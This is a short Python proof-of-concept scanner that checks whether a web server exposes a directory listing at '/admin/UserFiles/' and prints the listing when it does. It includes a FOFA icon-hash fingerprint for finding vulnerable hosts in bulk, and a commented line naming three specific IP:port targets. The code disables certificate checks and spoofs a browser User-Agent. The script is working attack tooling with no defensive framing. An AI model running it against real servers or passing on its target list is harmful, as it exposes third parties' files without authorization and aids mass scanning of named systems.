#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+          FOFA: icon_hash="-320896955"')

def run_proto(url):
    check_url = url + "/admin/UserFiles/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        resp = requests.get(url=check_url, headers=headers,  verify=False, timeout=3)
        if '[To Parent Directory]' in resp.text and '/admin/UserFiles/' in resp.text and resp.status_code == 200:
            print(resp.text)
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '182.151.21.232:9010;101.132.151.203:8080;81.68.109.231:8000'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

